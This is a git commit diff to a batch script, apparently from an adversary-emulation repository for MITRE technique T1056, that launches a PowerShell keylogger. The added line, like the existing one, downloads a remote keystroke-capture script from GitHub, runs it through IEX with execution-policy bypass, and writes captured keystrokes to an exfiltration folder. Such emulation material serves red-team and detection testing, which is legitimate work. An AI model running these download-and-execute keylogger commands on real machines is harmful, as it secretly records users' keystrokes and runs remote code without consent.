adae69e2bcd2ce2e3023510cfc524df79bcef094
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 13:08:18 +0530

    Update T1056.bat

--- Payloads/T1056/T1056.bat
+++ Payloads/T1056/T1056.bat
@@ -8,5 +8,6 @@ ECHO Technique: Input Capture (T1056)
 ECHO.
 ECHO [+] Initiating Powershell Keylogger to capture KeyStrokes
 ECHO -------------------------------------------------------------------
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1'); Get-Keystrokes  -LogPath %EXFIL%\keycapture.log | powershell.exe -
 powershell.exe -ep bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1'); Get-Keystrokes  -LogPath %EXFIL%\keycapture.log"
 ECHO.
